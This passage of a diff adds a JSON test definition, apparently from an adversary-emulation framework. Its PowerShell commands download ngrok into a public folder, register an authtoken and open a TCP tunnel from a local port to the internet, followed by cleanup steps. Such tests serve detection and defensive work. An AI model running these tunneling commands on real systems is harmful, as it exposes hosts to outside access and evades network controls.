+                                "get_prereq_command": "New-Item -Path C:\\Users\\Public\\ngrok -ItemType Directory | Out-Null\nInvoke-WebRequest #{download} -OutFile C:\\Users\\Public\\ngrok\\ngrok-v3-stable-windows-amd64.zip\nExpand-Archive C:\\Users\\Public\\ngrok\\ngrok-v3-stable-windows-amd64.zip -DestinationPath C:\\Users\\Public\\ngrok\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken #{api_token} | Out-Null\nStart-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe tcp #{port_num} } | Out-Null\nStart-Sleep -s 5 \nStop-Job -Name Job1 | Out-Null\n",
+                            "cleanup_command": "Remove-Item C:\\Users\\Public\\ngrok -Recurse -ErrorAction Ignore\nRemove-Item C:\\%userprofile%\\AppData\\Local\\ngrok -ErrorAction Ignore\n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 17:18:57"
+}
